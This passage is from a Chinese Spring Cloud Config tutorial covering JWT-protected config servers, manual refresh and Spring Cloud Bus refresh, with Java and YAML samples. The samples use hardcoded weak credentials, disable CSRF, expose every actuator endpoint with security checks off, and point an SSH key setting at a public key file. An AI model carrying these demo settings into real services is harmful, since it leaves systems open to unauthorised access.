12org.springframework.cloud.bootstrap.BootstrapConfiguration=\\com.springcloud.study.config.ConfigClientBootstrapConfiguration iii. 创建 Config Server 工程创建 Config Server 工程，配置工程里的 pom.xml 文件： 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.7&lt;/version&gt;&lt;/dependency&gt; 创建 Config Server 工程里的 JwtAuthenticationRequest 实体类，用于传递用户名和密码： 12345678910111213141516public class JwtAuthenticationRequest implements Serializable { private String username; private String password; public JwtAuthenticationRequest() { super(); } public JwtAuthenticationRequest(String username, String password) { this.setUsername(username); this.setPassword(password); } //省略getter、setter方法} 创建 Config Server 工程里的 JwtAuthenticationResponse 实体类，用于返回 Token 信息： 12345678910public class JwtAuthenticationResponse implements Serializable { private final String token; public JwtAuthenticationResponse(String token) { this.token = token; } //省略getter、setter方法} 创建 Config Server 工程里的 JwtUser 实体类，用于返回 JWT 用户认证信息： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class JwtUser implements UserDetails { private final String username; private final String password; private final Collection&lt;? extends GrantedAuthority&gt; authorities; public JwtUser(String username, String password, Collection&lt;? extends GrantedAuthority&gt; authorities) { this.username = username; this.password = password; this.authorities = authorities; } @Override public String getUsername() { return username; } @JsonIgnore @Override public boolean isAccountNonExpired() { return true; } @JsonIgnore @Override public boolean isAccountNonLocked() { return true; } @JsonIgnore @Override public boolean isCredentialsNonExpired() { return true; } @JsonIgnore @Override public String getPassword() { return password; } @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() { return authorities; } @Override public boolean isEnabled() { return true; } @Override public String toString() { return "JwtUser [username=" + username + ", password=" + password + ", authorities=" + authorities + "]"; }} 创建 Config Server 工程里的 JWT Token 认证过滤器： 12345678910111213141516171819202122232425262728public class JwtAuthenticationTokenFilter extends UsernamePasswordAuthenticationFilter { @Autowired private UserDetailsService userDetailsService; @Autowired private JwtTokenUtil jwtTokenUtil; private final String tokenHeader = "token"; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest httpRequest = (HttpServletRequest) request; String authToken = httpRequest.getHeader(tokenHeader); String username = jwtTokenUtil.getUsernameFromToken(authToken); if (username != null &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == null) { UserDetails userDetails = this.userDetailsService.loadUserByUsername(username); if (jwtTokenUtil.validateToken(authToken, userDetails)) { UsernamePasswordAuthenticationToken auth = new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities()); auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(httpRequest)); SecurityContextHolder.getContext().setAuthentication(auth); } } chain.doFilter(request, response); }} 创建 Config Server 工程里的 JWT 工具类，主要用于根据传递过来的用户信息生成 JWT 的 Token，或者是验证请求的 Token 是否合法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104@Componentpublic class JwtTokenUtil implements Serializable { private static final long serialVersionUID = -8652360919584431721L; private static final String CLAIM_KEY_USERNAME = "sub"; private static final String CLAIM_KEY_AUDIENCE = "audience"; private static final String CLAIM_KEY_CREATED = "created"; private static final String AUDIENCE_UNKNOWN = "unknown"; private static final String AUDIENCE_WEB = "web"; private Key secret = MacProvider.generateKey(); private Long expiration = (long) 120; // 2 minutes /** * 生成token * * @param userDetails * @return */ public String generateToken(JwtUser userDetails) { Map&lt;String, Object&gt; claims = new HashMap&lt;&gt;(); claims.put(CLAIM_KEY_USERNAME, userDetails.getUsername()); claims.put(CLAIM_KEY_AUDIENCE, AUDIENCE_WEB); claims.put(CLAIM_KEY_CREATED, new Date().getTime() / 1000); return generateToken(claims); } /** * jwt 实际生成token * * @param claims * @return */ private String generateToken(Map&lt;String, Object&gt; claims) { return Jwts.builder().setClaims(claims).setExpiration(generateExpirationDate()) .signWith(SignatureAlgorithm.HS512, secret).compact(); } private Date generateExpirationDate() { return new Date(System.currentTimeMillis() + expiration * 1000); } public String getUsernameFromToken(String token) { if (token == null) { return null; } String username; try { final Claims claims = getClaimsFromToken(token); username = claims.getSubject(); } catch (Exception e) { username = null; } return username; } private Claims getClaimsFromToken(String token) { Claims claims; final String tokenClean = token.substring(7); // remove "Bearer:" try { claims = Jwts.parser().setSigningKey(secret).parseClaimsJws(tokenClean).getBody(); } catch (Exception e) { claims = null; } return claims; } /** * 校验token的合法性 * * @param token * @param userDetails * @return */ public Boolean validateToken(String token, UserDetails userDetails) { JwtUser user = (JwtUser) userDetails; final String username = getUsernameFromToken(token); return (username.equals(user.getUsername()) &amp;&amp; !isTokenExpired(token)); } private Boolean isTokenExpired(String token) { final Date expiration = getExpirationDateFromToken(token); return expiration.before(new Date()); } public Date getExpirationDateFromToken(String token) { Date expiration; try { final Claims claims = getClaimsFromToken(token); expiration = claims.getExpiration(); } catch (Exception e) { expiration = null; } return expiration; }} 创建 Config Server 工程里的 JWT 认证端点类，主要用于在认证过程中，若认证未能通过直接返回 401 状态码： 123456789@Componentpublic class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint, Serializable { @Override public void commence(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException { // 没有认证通过将添加401 httpServletResponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Unauthorized"); }} 创建 Config Server 工程里的账号验证类，主要用于客户端的验证用户名和密码： 12345678910111213141516171819202122232425@Servicepublic class MemberServiceImpl implements UserDetailsService { private static final PasswordEncoder BCRYPT = new BCryptPasswordEncoder(); @Value("${spring.security.user.name}") private String hardcodedUser; @Value("${spring.security.user.password}") private String password; @Override public JwtUser loadUserByUsername(String username) throws UsernameNotFoundException { // 对密码进行加密 String hardcodedPassword = BCRYPT.encode(password); if (username.equals(hardcodedUser) == false) { throw new UsernameNotFoundException(String.format("No user found with username \'%s\'.", username)); } else { SimpleGrantedAuthority simpleGrantedAuthority = new SimpleGrantedAuthority("ROLE_USER"); List&lt;GrantedAuthority&gt; grantedAuthorityList = new ArrayList&lt;GrantedAuthority&gt;(); grantedAuthorityList.add(simpleGrantedAuthority); return new JwtUser(hardcodedUser, hardcodedPassword, grantedAuthorityList); } }} 创建 Config Server 工程的 WebAuthenticationDetailsSourceImpl 类，用于将传递过来的对象数据封装到 JwtAuthenticationRequest 里面，该类负责将数据封装成 JSON 格式后返回给客户端： 12345678910111213141516171819202122232425@Componentpublic class WebAuthenticationDetailsSourceImpl implements AuthenticationDetailsSource&lt;HttpServletRequest, JwtAuthenticationRequest&gt; { @Override public JwtAuthenticationRequest buildDetails(HttpServletRequest request) { Gson gson = new Gson(); String json = new String(); String output = new String(); BufferedReader br; StringBuffer buffer = new StringBuffer(16384); JwtAuthenticationRequest jwtAuthenticationRequest = new JwtAuthenticationRequest(); try { br = new BufferedReader(new InputStreamReader(request.getInputStream())); while ((output = br.readLine()) != null) { buffer.append(output); } json = buffer.toString(); jwtAuthenticationRequest = gson.fromJson(json, JwtAuthenticationRequest.class); } catch (IOException e) { e.printStackTrace(); } return jwtAuthenticationRequest; }} 创建 Config Server 工程的 AuthenticationRestController 类，主要用于颁发 Token 给客户端： 1234567891011121314151617181920212223242526272829@RestControllerpublic class AuthenticationRestController { @Autowired private AuthenticationManager authenticationManager; @Autowired private JwtTokenUtil jwtTokenUtil; @Autowired private MemberServiceImpl userDetailsService; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @RequestMapping(value = "/auth", method = RequestMethod.POST) public ResponseEntity&lt;?&gt; createAuthenticationToken(HttpServletRequest request) { JwtAuthenticationRequest jwtAuthenticationRequest = webAuthenticationDetailsSource.buildDetails(request); UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(jwtAuthenticationRequest.getUsername(), jwtAuthenticationRequest.getPassword()); authToken.setDetails(jwtAuthenticationRequest); Authentication authenticate = authenticationManager.authenticate(authToken); SecurityContextHolder.getContext().setAuthentication(authenticate); JwtUser userDetails = userDetailsService.loadUserByUsername(jwtAuthenticationRequest.getUsername()); final String token = jwtTokenUtil.generateToken(userDetails); return ResponseEntity.ok(new JwtAuthenticationResponse(token)); }} 创建 Config Server 工程的 SecurityConfig 类，主要作用是进行安全认证和 Token 的过滤： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960@Configuration@EnableWebSecurity@EnableGlobalMethodSecurity(prePostEnabled = true)public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private JwtAuthenticationEntryPoint unAuthorizedHandler; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @Bean @ConditionalOnMissingBean(AuthenticationManager.class) public UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter(AuthenticationManager authenticationManager) throws Exception { UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter = new UsernamePasswordAuthenticationFilter(); usernamePasswordAuthenticationFilter.setAuthenticationManager(authenticationManager); usernamePasswordAuthenticationFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return usernamePasswordAuthenticationFilter; } @Bean public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } @Bean public JwtAuthenticationTokenFilter authenticationTokenFilter() throws Exception { JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter = new JwtAuthenticationTokenFilter(); jwtAuthenticationTokenFilter.setAuthenticationManager(authenticationManager()); jwtAuthenticationTokenFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return jwtAuthenticationTokenFilter; } @Override protected void configure(HttpSecurity httpSecurity) throws Exception { httpSecurity .csrf().disable() .exceptionHandling().authenticationEntryPoint(unAuthorizedHandler) .and() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() .antMatchers(HttpMethod.GET, "/").permitAll() .antMatchers("/auth/**").permitAll() .anyRequest().authenticated().and().formLogin() .authenticationDetailsSource(webAuthenticationDetailsSource) .permitAll(); // 添加自定义的jwt安全过滤的filter httpSecurity.addFilterBefore(authenticationTokenFilter(), UsernamePasswordAuthenticationFilter.class); httpSecurity.headers().cacheControl(); }} iiii. 创建 Config Client 工程这里的 Config Client 工程与上面 “客户端回退” 示例中的 Config Client 工程的代码一致，直接拷贝一份即可，这里不再累述。 Config Client 里的 pom.xml 文件，引入上面的 config-client-jwt 依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-jwt&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Client 里的 application.yml 配置文件： 123spring: application: name: config-client Config Client 里的 bootstrap.yml 配置文件，其中 password 和 username 是 Config Server 端配置需要的认证用户信息，endpoint 是一个 Config Server 访问验证授权的地址： 1234567891011spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 username: admin password: 123456 enabled: false endpoint: http://localhost:8001/auth #指定JWT的认证地址 iiiii. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9090/getConfigInfo，接口会返回 I am the git configuration file from dev environment，说明一切运行正常 config-client 特意填写错误的账号信息，然后重新启动 config-client 应用，观察控制台是否会出现 401 授权失败的错误 下篇 - Config 入门教程（高级篇） Config 入门教程 - 高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Config 入门教程 - 基础篇",url:"/posts/9de3ccde.html",text:'配置中心介绍什么是配置中心在集中式开发时代，配置文件已经基本足够了，因为那时配置的管理通常不会成为一个很大的问题。但是在互联网时代，应用都是分布式系统，部署在 N 台服务器上，想要去线上一台台地重启机器肯定不靠谱，并且维护成本也很高，所以配置中心应运而生。配置中心被用作集中管理不同环境（Dev、Test、Stage、Prod）和不同集群配置，以及在修改配置后将实时动态推送到应用上进行刷新。配置中心应具备的功能如下： Open API 业务无关性 高可用集群 配置生效监控 配合灰度与更新 一致性 K-V 存储 统一配置实时推送 配置全局恢复、备份与历史 主流配置中心对比 Spring Cloud Config、Apollo、Nacos 对比图 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图 Config 配置中心概述Spring Cloud Config 是一个集中化外部配置的分布式系统，由服务端和客户端组成。它不依赖于注册中心，是一个独立的配置中心。Spring Cloud Config 支持多种存储配置信息的形式，目前主要有 JDBC、Vault、Native、SVN、Git，其中默认为 Git 存储形式，Git 版的工作原理如下图： 配置中心流转与整体支持图 Config 入门案例1. 版本说明在本文中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外，点击下载完整的案例代码。 2. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 3. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 添加 Config Server 需要的 application.yml 配置文件到工程中，其中 uri 指的是 Git 远程仓库的地址，private_key_file 是指 SSH 公钥文件；若 Git 仓库地址使用的是 HTTPS 协议，此时可以使用 usemame 、password 参数替代掉 private_key_file，两者分别代表 Git 访问的用户名和密码；search-paths 表示搜索特定目录下所有满足条件的配置文件，可以根据需求添加多个目录，目录之间用逗号隔开；label 指的是 Git 仓库的分支名称，如果不写，默认的分支为 master 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master 启动 Config Server 应用后，可以看到控制台会输出如下信息，这里只是截取关键信息，从控制台信息里的 Mapped 中可以看到配置信息和 URL 的映射关系；其中 name 是应用名称，也可以理解成 Git 仓库里配置文件的名称，profile 指的是对应激活的环境名，例如 dev、test、prod 等，label 指的是 Git 的分支 12345678910Mapped "{[/{name}-{profiles}.yml || /{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profiles:.*[^-].*}],methods=[GET]}"Mapped "{[/{name}/{profiles}/{label:.*}],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.properties],methods=[GET]}"Mapped "{[/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.yml || /{label}/{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profile}/**],methods=[GET],params=[useDefaultLabel]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET],produces=[application/octet-stream]}" 通过 http://127.0.0.1:8001/config-client/dev/master 访问 Config Server，接口返回的结果如下 此时观察 Config Server 控制台打印的信息可知，Config Server 会在本地的临时目录下面克隆远程仓库中的配置文件，本地临时目录的路径如下： 1o.s.c.c.s.e.NativeEnvironmentRepository : Adding property source: file:/tmp/config-repo-3558022506897899775/application.yml (document #0) 5. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Client 的主启动类： 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息： 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中： 123spring: application: name: config-client 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中，这些配置为什么要放在 bootstrap.yml 里，而不放在 application.yml 中呢？这与 Spring Boot 的加载顺序有关，bootstrap.yml 文件会优先于 application.yml 加载，因此会去加载远程的配置文件信息 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 6. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 重启 config-client 应用，再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 刷新配置中心信息Config Client 手动刷新为了不用重启 Congit Client 应用也可以获取到最新的配置信息，下面将讲解在 Congit Client 端如何手动刷新配置信息，点击下载完整的案例代码。 i. 准备工作本示例用到上面入门案例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 ii. 创建 Config Server 工程由于本示例是在上面的入门案例的基础上进行改造的，因此 Config Server 工程与上面入门案例中的 Config Server 工程完全一样，只需拷贝一份即可，由于篇幅有限，这里不再累述。 iii. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; 添加 Config Client 需要的 application.yml 配置文件到工程中，management.endpoints.web.exposure.include=* 表示暴露所有端点，默认情况下只暴露 info、health 端点，management.endpoint.health.show-details=always 表示总是显示详细信息 1234567891011spring: application: name: config-clientmanagement: endpoints: web: exposure: include: "*" health: show-details: always 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 往 Config Client 添加安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息。注意，这里的 ConfigProperties 与 ConfigController 类都需要额外添加 @RefreshScope 注解，被 @RefreshScope 注解修饰的 Bean 都是延迟加载的，只有在第一次访问时才会被初始化；刷新 Bean 也是同理，刷新后下次访问会创建一个新的对象 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} iiii. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 通过 Post 请求访问 http://127.0.0.1:9001/actuator/refresh，让 Config Client 刷新配置信息 再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 结合 Spring Cloud Bus 热更新Spring Cloud Config 结合 Spring Cloud Bus 进行刷新的整体流程图如下，当用户更新配置信息时，触发 Git Hook 配置地址的调用，Config Server 接收到 Refresh 请求后，通过 Bus 将消息发送到 Config Client，当 Config Client 接收到消息后会重新发送请求加载配置信息，大体流程就是这样。下面将使用 RabbitMQ 作为消息中间件，由于篇幅有限，这里不再讲解 RabbitMQ 的安装和使用方法，点击下载完整的案例代码。 1. 准备工作本示例用到上面入门案例中 Git 仓库里的配置文件，包括 config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖，第四个是消息中间件的依赖： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} 创建 Config Server 的安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 添加 Config Server 需要的 application.yml 配置文件到工程中，其中包括 RabbitMQ 的地址和账号信息，spring.cloud.bus.trace.enabled=true 表示开启消息跟踪： 12345678910111213141516171819202122232425262728293031server: port: 8001spring: application: name: config-server rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: true config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: mastermanagement: endpoints: web: exposure: include: "*" health: show-details: always 3. 创建 Config Client 工程创建 Config Client 的 Maven 工程，配置工程里的 pom.xml 文件，第二个依赖是端点的访问依赖，第三个依赖是安全的依赖，第四个是消息中间件的依赖： 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt; 往 Config Client 添加安全配置类，主要作用是关闭端点访问的安全校验： 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} 为了更好地观察拉取到的 Git 上面的配置，这里需要创建一个 Controller 用于访问返回配置信息，同时还需要创建一个实体，用于注入远程配置上的信息；注意，这里的 ConfigProperties 与 ConfigController 类都需要额外添加 @RefreshScope 注解 123456789101112131415@Component@RefreshScopepublic class ConfigProperties { @Value("${cn.springcloud.config}") private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 123456789101112@RefreshScope@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} 添加 Config Client 需要的 application.yml 配置文件到工程中，其中包括 RabbitMQ 的地址和账号信息，spring.cloud.bus.trace.enabled=true 表示开启消息跟踪： 1234567891011121314151617181920spring: application: name: config-client rabbitmq: port: 5672 host: localhost username: admin password: admin cloud: bus: trace: enabled: truemanagement: endpoints: web: exposure: include: "*" health: show-details: always 添加 Config Client 需要的 bootstrap.yml 配置文件到工程中： 1234567spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 4. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 通过 Post 请求访问 http://127.0.0.1:8001/actuator/bus-refresh，让 Config Server 通过 Spring Cloud Bus 发送消息通知所有 Config Client 刷新配置信息 再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了提示：可以将 Spring Cloud Bus 的刷新地址配置在 WebHooks 上面，这样在 Git 仓库每次有新文件提交（Push）之后，所有 Config Client 都会自动执行刷新的动作 Config Client 自动刷新（任务调度）在有些应用上面，不需要在服务端批量推送消息的时候，客户端本身需要获取参数变化的情况，此时可以使用客户端的自动刷新功能，其原理是使用任务调度执行刷新操作，点击下载完整的案例代码 1. 准备说明本示例用到上面入门案例中 Git 仓库里的配置文件，包括 